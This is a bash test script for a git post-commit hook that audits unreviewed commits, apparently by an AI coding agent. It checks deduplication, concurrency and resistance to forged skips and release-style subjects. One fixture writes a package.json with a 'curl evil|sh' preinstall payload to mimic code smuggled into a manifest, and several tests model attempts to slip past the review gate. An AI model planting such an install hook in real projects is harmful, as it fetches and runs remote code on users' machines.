#!/usr/bin/env bash
# Tests for #352 denoise: post-commit-consume-marker.sh must not let the
# unreviewed-commit audit event over-count, and must stay unforgeable.
#
#   1. Dedup: the same immutable SHA is logged at most once, even if the hook
#      re-fires on the same HEAD (the actual log-inflation this fix targets).
#   2. Unforgeable: the audit records a markerless commit regardless of its
#      subject OR its changeset. There is deliberately NO release exemption —
#      a subject string ("chore(release)", "[skip ci]") is author-controlled,
#      and a manifest-only allowlist is dodged by smuggling a code payload into
#      an inert-looking manifest — so neither may suppress the audit.
#
# Runs against an ISOLATED temp git repo so it never touches the real bypass log.
#
# Usage: bash tests/test-unreviewed-commit-suppress.sh
# Exit: 0 if all pass, 1 if any fail.

set -euo pipefail
. "$(dirname "$0")/lib/git-env-isolation.sh" || exit 1
cd "$(dirname "$0")/.."
HOOK="$PWD/hooks/gate-scripts/post-commit-consume-marker.sh"

PASS=0; FAIL=0; TOTAL=0
assert() {
    local name="$1" expected="$2" got="$3"
    TOTAL=$((TOTAL + 1))
    if [[ "$got" == "$expected" ]]; then
        printf "  PASS  %s\n" "$name"; PASS=$((PASS + 1))
    else
        printf "  FAIL  %s (expected=%s got=%s)\n" "$name" "$expected" "$got"; FAIL=$((FAIL + 1))
    fi
}

TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT
git -C "$TMP" init -q
git -C "$TMP" config user.email t@t.dev
git -C "$TMP" config user.name tester

# Fire the hook as a PostToolUse Bash git-commit event, cwd anchored to the repo.
# No litmus-passed.local marker exists -> the unreviewed-commit path runs.
fire() {  # $1 = commit subject shown in tool_output
    local subj="$1" sha
    sha=$(git -C "$TMP" rev-parse --short HEAD)
    printf '{"tool_name":"Bash","cwd":"%s","tool_input":{"command":"git commit -m x"},"tool_output":{"output":"[main %s] %s"}}' \
        "$TMP" "$sha" "$subj" | bash "$HOOK" 2>/dev/null || true
}
count_event() {  # $1 = event, $2 = full sha ; echoes occurrences in the temp log
    local log="$TMP/.claude/bypass-log.jsonl" c
    [[ -f "$log" ]] || { echo 0; return; }
    # grep -c prints the count (0 on no match) but exits 1 when zero — swallow it.
    c=$(grep -cF "\"event\":\"$1\",\"gate\":\"post-commit\",\"sha\":\"$2\"" "$log" 2>/dev/null || true)
    echo "${c:-0}"
}

echo "── unforgeable: manifest-only + release subject IS logged ────"
# The worst case for a would-be bypass: a commit that changes ONLY a manifest
# (path-selection forge) AND carries a release-flavored subject (subject forge).
# A code payload can hide in package.json (preinstall) or plugin.json (hooks),
# so this must STILL be logged — no subject or changeset may suppress the audit.
printf '{"version":"9.9.9","scripts":{"preinstall":"curl evil|sh"}}\n' > "$TMP/package.json"
git -C "$TMP" add -A
git -C "$TMP" commit -q -m "chore(release): 9.9.9 [skip ci]"
FORGE=$(git -C "$TMP" rev-parse HEAD)
fire "chore(release): 9.9.9 [skip ci]"
got=$(count_event unreviewed-commit "$FORGE")
assert "manifest-only + release subject IS logged unreviewed (no exemption)" "1" "$got"

echo ""
echo "── unknown SHA is never deduped (unresolvable HEAD) ──────────"
# When git rev-parse HEAD fails the SHA is "unknown" — not a stable identity.
# Two such gate-misses must BOTH be logged, or distinct records collapse to one.
NOREPO=$(mktemp -d)
fire_at() {  # fire the hook with cwd = a non-git dir -> COMMIT_SHA resolves empty
    printf '{"tool_name":"Bash","cwd":"%s","tool_input":{"command":"git commit -m x"},"tool_output":{"output":"created commit"}}' \
        "$1" | bash "$HOOK" 2>/dev/null || true
}
fire_at "$NOREPO"; fire_at "$NOREPO"
ulog="$NOREPO/.claude/bypass-log.jsonl"
uc=0; [[ -f "$ulog" ]] && uc=$(grep -cF '"event":"unreviewed-commit","gate":"post-commit","sha":"unknown"' "$ulog" 2>/dev/null || true)
assert "two unresolved gate-misses both logged (unknown not deduped)" "2" "${uc:-0}"
rm -rf "$NOREPO"

echo ""
echo "── same-SHA dedup under CONCURRENCY (exercises the flock) ─────"
echo n > "$TMP/f"; git -C "$TMP" add -A
git -C "$TMP" commit -q -m "feat: a normal reviewed-by-nobody commit"
NORM=$(git -C "$TMP" rev-parse HEAD)
# Fire 8 hooks in PARALLEL for the same HEAD. A grep-then-append (no lock)
# would let several race past the check and double-log; the flock serializes
# check+append so exactly one wins. Sequential fires would not exercise this.
for _ in 1 2 3 4 5 6 7 8; do
    fire "feat: a normal reviewed-by-nobody commit" &
done
wait
got=$(count_event unreviewed-commit "$NORM")
assert "8 concurrent fires for the same HEAD log exactly once (flock)" "1" "$got"

echo ""
echo "── skip suppression keys on \"skip\":\"litmus\" only (#895) ─────"
# A Gate 1 design-lease claim logs skip-review-consumed BEFORE Gate 2 decides, so
# it is not a sanctioned commit bypass: it must NOT suppress the markerless audit.
# Only the pre-commit gate's skip-litmus.local consumption (which carries
# "skip":"litmus") may. Timestamps are "now", well inside the 120s window.
now_ts() { date -u +%Y-%m-%dT%H:%M:%SZ; }
mkdir -p "$TMP/.claude"
printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","lease_slot":1,"lease_max":20}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
echo lease > "$TMP/f"; git -C "$TMP" add -A
git -C "$TMP" commit -q -m "feat: commit after a design-lease claim only"
LEASE=$(git -C "$TMP" rev-parse HEAD)
fire "feat: commit after a design-lease claim only"
got=$(count_event unreviewed-commit "$LEASE")
assert "recent design-lease skip-review-consumed (no skip field) does NOT suppress" "1" "$got"

printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","skip":"litmus"}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
echo litmus > "$TMP/f"; git -C "$TMP" add -A
git -C "$TMP" commit -q -m "feat: commit after a litmus skip"
LSKIP=$(git -C "$TMP" rev-parse HEAD)
fire "feat: commit after a litmus skip"
got=$(count_event unreviewed-commit "$LSKIP")
assert "recent skip-review-consumed with skip:litmus DOES suppress" "0" "$got"

# The NEWEST skip-review-consumed record decides. An older litmus record still in
# the 120s window must not suppress a later markerless commit whose own record is
# a Gate 1 lease claim (filter-before-tail would pick the stale litmus line).
printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","lease_slot":2,"lease_max":20}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
echo lease2 > "$TMP/f"; git -C "$TMP" add -A
git -C "$TMP" commit -q -m "feat: lease claim after an earlier litmus skip"
LEASE2=$(git -C "$TMP" rev-parse HEAD)
fire "feat: lease claim after an earlier litmus skip"
got=$(count_event unreviewed-commit "$LEASE2")
assert "newer design-lease record overrides an older litmus record (NOT suppressed)" "1" "$got"

echo ""
echo "── per-call claim named by tool_use_id (#898) ─────────────────"
INCOMPLETE=0
fire_id() {  # $1 = tool_use_id carried by the PostToolUse payload
    local sha
    sha=$(git -C "$TMP" rev-parse --short HEAD)
    # The hook clears the block counter last, so a counter that survives means it
    # stopped early: a zero audit count is then a crash, not a suppression.
    : > "$TMP/.claude/.gate-block-count.local"
    printf '{"tool_name":"Bash","tool_use_id":"%s","cwd":"%s","tool_input":{"command":"git commit -m x"},"tool_output":{"output":"[main %s] x"}}' \
        "$1" "$TMP" "$sha" | bash "$HOOK" 2>/dev/null || true
    [[ -e "$TMP/.claude/.gate-block-count.local" ]] && INCOMPLETE=$((INCOMPLETE + 1))
    return 0
}
GATE="$PWD/hooks/gate-scripts/pre-commit-gate.sh"
consume_skip() {  # $1 = tool_use_id of the PreToolUse payload that consumes the skip
    touch -t 202001010000 "$TMP/.claude/skip-litmus.local"
    printf '{"tool_name":"Bash","tool_use_id":"%s","cwd":"%s","tool_input":{"command":"git commit -m x"}}' \
        "$1" "$TMP" | bash "$GATE" >/dev/null 2>&1 || true
}
consume_skip toolu_A
claim_of() { printf '%s/.claude/litmus-skip-claim-%s.local' "$TMP" "$(printf '%s' "$1" | shasum -a 256 | cut -d' ' -f1)"; }
assert "the gate leaves a claim named by the tool_use_id" "yes" "$([[ -f "$(claim_of toolu_A)" ]] && echo yes || echo no)"
# Interleaved runs: another call's design-lease record lands after this one's
# skip record, so the skip is no longer the newest. The claim still suppresses
# this commit (main logged it unreviewed) ...
printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","lease_slot":5,"lease_max":20}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
echo ida > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: A"
IDA=$(git -C "$TMP" rev-parse HEAD)
fire_id toolu_A
assert "own claim suppresses despite a newer skip record" "0" "$(count_event unreviewed-commit "$IDA")"
fire_id toolu_A
assert "a repeated delivery for the same commit is suppressed too" "0" "$(count_event unreviewed-commit "$IDA")"
# ... and a fresh skip that belongs to another call never suppresses (main
# suppressed it).
consume_skip toolu_B
echo idc > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: C"
IDC=$(git -C "$TMP" rev-parse HEAD)
fire_id toolu_C
assert "another call's fresh skip does NOT suppress" "1" "$(count_event unreviewed-commit "$IDC")"
# A present but unusable id suppresses nothing, even with a fresh plain litmus
# record that the id-less fallback would accept.
printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","skip":"litmus"}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
for bad in '"bad id"' 'null' '""'; do
    echo "x$bad" > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: bad"
    BAD=$(git -C "$TMP" rev-parse HEAD)
    printf '{"tool_name":"Bash","tool_use_id":%s,"cwd":"%s","tool_input":{"command":"git commit -m x"},"tool_output":{"output":"[main %s] x"}}' \
        "$bad" "$TMP" "$(git -C "$TMP" rev-parse --short HEAD)" | bash "$HOOK" 2>/dev/null || true
    assert "tool_use_id $bad suppresses nothing" "1" "$(count_event unreviewed-commit "$BAD")"
done
# A claim that is a symlink is not a claim.
ln -s /dev/null "$(claim_of toolu_E)"
echo ide > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: E"
IDE=$(git -C "$TMP" rev-parse HEAD)
fire_id toolu_E
assert "a symlinked claim does NOT suppress" "1" "$(count_event unreviewed-commit "$IDE")"
# A skip consumed by a call that has a tool_use_id is logged as litmus-claim, so
# an id-less payload (another harness) cannot borrow it through the log.
consume_skip toolu_F
assert "an id-bearing skip is logged as litmus-claim" '"skip":"litmus-claim"}' "$(tail -1 "$TMP/.claude/bypass-log.jsonl" | grep -o '"skip":"[^"]*"}')"
echo idf > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: F"
IDF=$(git -C "$TMP" rev-parse HEAD)
fire "feat: F"
assert "an id-less payload is not suppressed by an id-bearing skip" "1" "$(count_event unreviewed-commit "$IDF")"
# An id-less PreToolUse still logs the plain litmus record the fallback reads.
touch -t 202001010000 "$TMP/.claude/skip-litmus.local"
printf '{"tool_name":"Bash","cwd":"%s","tool_input":{"command":"git commit -m x"}}' "$TMP" | bash "$GATE" >/dev/null 2>&1 || true
assert "an id-less skip is logged as plain litmus" '"skip":"litmus"}' "$(tail -1 "$TMP/.claude/bypass-log.jsonl" | grep -o '"skip":"[^"]*"}')"
# Claims older than a day are pruned when the next skip is consumed.
touch -t 202001010000 "$(claim_of toolu_OLD)" "$TMP/.claude/litmus-skip-claim-notes.local"
consume_skip toolu_G
assert "a day-old claim is pruned" "no" "$([[ -e "$(claim_of toolu_OLD)" ]] && echo yes || echo no)"
assert "a file the gate could not have named is not pruned" "yes" "$([[ -e "$TMP/.claude/litmus-skip-claim-notes.local" ]] && echo yes || echo no)"
# Ids that differ only in case get distinct claims (case-insensitive volumes).
consume_skip toolu_case
echo idcase > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: case"
IDCASE=$(git -C "$TMP" rev-parse HEAD)
fire_id toolu_CASE
assert "a claim does not match an id differing only in case" "1" "$(count_event unreviewed-commit "$IDCASE")"
# The id-less fallback reads top-level fields: a nested skip does not count.
printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","nested":{"skip":"litmus"}}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
echo idn > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: nested"
IDN=$(git -C "$TMP" rev-parse HEAD)
fire "feat: nested"
assert "an id-less payload is not suppressed by a nested skip field" "1" "$(count_event unreviewed-commit "$IDN")"
# ... nor by a NaN record, and a newer spaced record still decides.
printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","skip":"litmus","n":NaN}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
echo idnan > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: nan"
IDNAN=$(git -C "$TMP" rev-parse HEAD)
fire "feat: nan"
assert "an id-less payload is not suppressed by a NaN record" "1" "$(count_event unreviewed-commit "$IDNAN")"
printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","skip":"litmus"}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
printf '{"ts": "%s", "event" : "skip-review-consumed", "skip" : "litmus-claim"}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
echo idsp > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: spaced"
IDSP=$(git -C "$TMP" rev-parse HEAD)
fire "feat: spaced"
assert "a newer spaced skip record decides over an older plain one" "1" "$(count_event unreviewed-commit "$IDSP")"
# A half-written newer line may be a skip record, so an older plain one behind
# it does not suppress.
printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","skip":"litmus"}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
printf '{"ts":"%s","event":"skip-rev\n' "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
echo idhalf > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: half"
IDHALF=$(git -C "$TMP" rev-parse HEAD)
fire "feat: half"
assert "a half-written newer line blocks the older plain record" "1" "$(count_event unreviewed-commit "$IDHALF")"
assert "every tool_use_id run reached the end of the hook" "0" "$INCOMPLETE"

echo ""
echo "═══════════════════════════════════════════════════════════════"
printf "Results: %d/%d passed" "$PASS" "$TOTAL"
if [[ "$FAIL" -gt 0 ]]; then printf " (%d FAILED)\n" "$FAIL"; exit 1; else printf " (all passed)\n"; exit 0; fi
